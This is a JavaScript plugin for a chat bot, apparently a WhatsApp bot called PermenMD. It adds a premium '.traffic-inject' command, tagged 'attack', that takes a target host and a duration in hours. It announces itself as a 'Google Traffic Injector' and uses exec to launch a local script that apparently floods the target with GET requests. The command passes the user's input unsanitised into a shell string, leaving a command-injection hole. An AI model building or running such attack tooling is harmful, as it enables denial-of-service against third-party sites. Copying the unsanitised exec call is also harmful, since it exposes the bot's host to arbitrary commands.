const { exec } = require('child_process')

const handler = async (m, { args }) => {
    if (args.length < 2) {
        m.reply(`\`\`\`[🔍] .traffic-inject [link] [duration]\`\`\``)
        return;
    }

    const hostname = args[0];
    const duration = args[1];

conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title:  global.title,
body: ``,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: global.attacking,
sourceUrl: ``
}}, text: `\`Google Traffic Injector\`
\`Host:\` ${hostname}
\`User:\` ${m.sender}
\`Duration:\` ${duration} Hours
\`Creator:\` PermenMD`}, {quoted: m})
    exec(`node ./lib/PermenMD/StarsXTraffic.js GET ${hostname} 10 ${duration}`);
}

handler.help = ['traffic-inject']
handler.tags = ['tools', 'attack'];
handler.premium = true
handler.command = /^(traffic-inject)$/i;
module.exports = handler
